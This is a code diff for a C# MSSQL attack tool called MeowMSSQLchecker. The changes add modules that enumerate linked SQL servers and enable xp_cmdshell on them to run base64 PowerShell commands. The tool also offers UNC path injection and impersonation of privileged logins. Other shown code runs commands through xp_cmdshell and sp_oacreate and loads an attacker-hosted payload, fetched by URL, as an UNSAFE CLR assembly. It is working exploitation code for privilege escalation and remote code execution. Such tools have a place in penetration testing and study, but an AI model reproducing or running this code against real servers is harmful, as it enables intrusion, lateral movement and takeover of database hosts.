@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Net;
 using System.Data.SqlClient;
-
+using System.Collections.Generic;
 
 namespace MeowMSSQLchecker
 {
@@ -13,24 +13,28 @@ namespace MeowMSSQLchecker
             {
                 Console.WriteLine("Usage : MeowMSSQLchecker.exe Module");
                 Console.WriteLine("Module :");
-                Console.WriteLine("    1  TARGET_HOST         Check Current User Groups.");
-                Console.WriteLine("    2  TARGET_HOST  LHOST  UNC Path Injection.");
-                Console.WriteLine("    3  TARGET_HOST         Find Impersonate User.");
-                Console.WriteLine("    4  TARGET_HOST         Try to Impersonate \"dbo\".");
-                Console.WriteLine("    5  TARGET_HOST  USER   Try to Impersonate User.");
+                Console.WriteLine("    1  TARGET_HOST          Check Current User Groups.");
+                Console.WriteLine("    2  TARGET_HOST  LHOST   UNC Path Injection.");
+                Console.WriteLine("    3  TARGET_HOST          Find Impersonate User.");
+                Console.WriteLine("    4  TARGET_HOST          Try to Impersonate \"dbo\".");
+                Console.WriteLine("    5  TARGET_HOST  USER    Try to Impersonate User.");
+                Console.WriteLine("    6  TARGET_HOST          Enumeration All Linked SQL Server.");
+                Console.WriteLine("    7  TARGET_HOST  SERVER  Remote Code Execution at Linked Server.");
                 return;
             }
 
             int mode = Convert.ToInt32(args[0]);
             string LHOST = "";
             string USER = "";
+            string SERVER = "";
             string sqlServer = args[1];
 
             if (mode == 2 & args.Length == 2)
             {
                 Console.WriteLine("[!] Missing params : LHOST");
                 return;
-            }else if (mode == 2 & args.Length == 3) {
+            }
+            else if (mode == 2 & args.Length == 3) {
                 LHOST = args[2];
             }
 
@@ -42,6 +46,16 @@ namespace MeowMSSQLchecker
             else if (mode == 5 & args.Length == 3)
             {
                 USER = args[2];
+            }
+
+            if (mode == 7 & args.Length == 2)
+            {
+                Console.WriteLine("[!] Missing params : SERVER");
+                return;
+            }
+            else if (mode == 7 & args.Length == 3)
+            {
+                SERVER = args[2];
             }
 
             string database = "master";
@@ -98,12 +112,13 @@ namespace MeowMSSQLchecker
                     }
                     break;
                 case 3:
-                    Console.WriteLine("[+] Module : Impersonate User");
+                    Console.WriteLine("[+] Module : List All Impersonate User");
                     SQL_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", 3, con);
                     break;
                 case 4:
+                    Console.WriteLine("[+] Module : Impersonate dbo");
                     Console.WriteLine("[+] Try to impersonate \"dbo\"");
-                    SQL_query("use msdb; EXECUTE AS USER = 'dbo';", 6, con);
+                    SQL_query("use msdb; EXECUTE AS USER = 'dbo';", 2, con);
                     if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                     {
                         Console.WriteLine("[+] Successful impersonate to dbo");
@@ -114,19 +129,43 @@ namespace MeowMSSQLchecker
                         return;
                     }
                     SQL_query("SELECT SYSTEM_USER;", 0, con);
-                    Post_impersonate(con);
+                    remote_code_execution(con);
                     break;
                 case 5:
+                    Console.WriteLine("[+] Module : Impersonate User");
                     Console.WriteLine("[+] Try to impersonate \"" + USER + "\"");
-                    SQL_query("EXECUTE AS LOGIN = '" + USER + "';", 6, con);
+                    SQL_query("EXECUTE AS LOGIN = '" + USER + "';", 2, con);
                     SQL_query("SELECT SYSTEM_USER;", 0, con);
-                    Post_impersonate(con);
+                    remote_code_execution(con);
+                    break;
+                case 6:
+                    Console.WriteLine("[+] Module : List All Linked Servers");
+                    SQL_query("EXEC sp_linkedservers;", 6, con);
+                    break;
+                case 7:
+                    string CMD = "";
+                    Console.WriteLine("[+] Module : Remote Code Execution at Linked Server");
+                    Console.WriteLine("[+] Enable xp_cmdshell");
+                    SQL_query("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + SERVER, 2, con);
+                    SQL_query("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + SERVER, 2, con);
+                    while (true)
+                    {
+                        Console.WriteLine("[!] WARNING : ONLY USE BASE64 ENCODE PAYLOAD");
+                        Console.Write("[?] Base64 Powershell : ");
+                        CMD = Console.ReadLine();
+                        if (CMD == "exit")
+                        {
+                            break;
+                        }
+                        Console.WriteLine("[+] Command Result :");
+                        SQL_query("EXEC ('xp_cmdshell ''powershell -enc " + CMD + "''') AT " + SERVER, 5, con);
+                    }
                     break;
             }
             con.Close();
         }
 
-        static void Post_impersonate(SqlConnection con)
+        static void remote_code_execution(SqlConnection con)
         {
             int module;
             string CMD;
@@ -152,6 +191,7 @@ namespace MeowMSSQLchecker
                             {
                                 break;
                             }
+                            Console.WriteLine("[+] Command Result :");
                             SQL_query("EXEC xp_cmdshell \"" + CMD + "\"", 5, con);
                         }
                         break;
@@ -168,25 +208,23 @@ namespace MeowMSSQLchecker
                             {
                                 break;
                             }
+                            Console.WriteLine("[+] Command Result :");
                             SQL_query("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + CMD + "\"'", 2, con);
                         }
                         break;
                     case 3:
-                        string ip;
-                        string filename;
+                        string url;
                         string payload;
                         Console.WriteLine("[+] Module : Remote Code Execution - Custom Assemblies");
-                        Console.Write("[?] Attack IP : ");
-                        ip = Console.ReadLine();
-                        Console.Write("[?] Payload Filename : ");
-                        filename = Console.ReadLine();
+                        Console.Write("[?] Payload URL : ");
+                        url = Console.ReadLine();
                         Console.WriteLine("[+] Disable CLR strict security");
                         SQL_query ("use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", 2, con);
                         Console.WriteLine("[+] Get payload from attacker");
                         WebClient web = new WebClient();
                         try
                         {
-                            payload = web.DownloadString("http://" + ip + "/" + filename);
+                            payload = web.DownloadString(url);
                         }
                         catch
                         {
@@ -203,6 +241,7 @@ namespace MeowMSSQLchecker
                         {
                             SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                             SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
+                            SQL_query("CREATE ASSEMBLY rce_assembly FROM 0x" + payload + " WITH PERMISSION_SET = UNSAFE;", 2, con);
                         }
                         
                         Console.WriteLine("[+] Create procedure");
@@ -213,15 +252,16 @@ namespace MeowMSSQLchecker
                             Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : '");
                             Console.Write("[?] Command : ");
                             CMD = Console.ReadLine();
-                            SQL_query("EXEC rce '" + CMD + "'", 5, con);
                             if (CMD == "exit")
                             {
                                 break;
                             }
+                            Console.WriteLine("[+] Command Result :");
+                            SQL_query("EXEC rce '" + CMD + "'", 5, con);
                         }
                         Console.WriteLine("[+] Clearn up");
-                        SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                         SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
+                        SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                         break;
                 }
             }
@@ -248,6 +288,7 @@ namespace MeowMSSQLchecker
                     break;
                 case 2:
                     result = true;
+                    reader.Close();
                     break;
                 case 3:
                     while(reader.Read())
@@ -264,7 +305,6 @@ namespace MeowMSSQLchecker
                     reader.Close();
                     break;
                 case 5:
-                    Console.WriteLine("[+] Command Result :");
                     while (reader.Read())
                     {
                         Console.WriteLine(reader[0]);
@@ -273,14 +313,68 @@ namespace MeowMSSQLchecker
                     reader.Close();
                     break;
                 case 6:
-                    result = true; 
+                    List<string> machines = new List<string>();
+                    result = true;
+                    while (reader.Read())
+                    {
+                        if (reader[0].ToString().Contains("\\")){
+                            machines.Add(reader[0].ToString().Split('\\')[0]);
+                        }
+                        else
+                        {
+                            machines.Add(reader[0].ToString());
+                        }
+                    }
+                    reader.Close();
+                    for (int i = 0; i < machines.Count; i++)
+                    {
+                        Console.Write("[+] Linked SQL Server : " + machines[i]);
+                        Console.Write(":");
+                        try
+                        {
+                            SQL_query("select myuser from openquery(\"" + machines[i] + "\", 'SELECT SYSTEM_USER as myuser')", 7, con);
+                        }
+                        catch
+                        {
+                            Console.Write(" Empty ");
+                        }
+                        Console.Write(":");
+                        try
+                        {
+                            SQL_query("select version from openquery(\"" + machines[i] + "\", 'select @@version as version')", 8, con);
+                        }
+                        catch
+                        {
+                            Console.WriteLine(" Empty ");
+                        }
+                    }
+                    break;
+                case 7:
+                    result = true;
+                    while (reader.Read())
+                    {
+                        Console.Write(reader[0]);
+                        break;
+                    }
+                    reader.Close();
+                    break;
+                case 8:
+                    result = true;
+                    string input = "";
+                    while (reader.Read())
+                    {
+                        input = reader[0].ToString();
+                        break;
+                    }
+                    string[] final_result = input.Split('\n');
+                    Console.WriteLine(final_result[0]);
+                    reader.Close();
                     break;
                 default: 
                     result = true;
-                    reader.Close(); 
+                    reader.Close();
                     break;
             }
-            reader.Close();
             return result;
         }
 
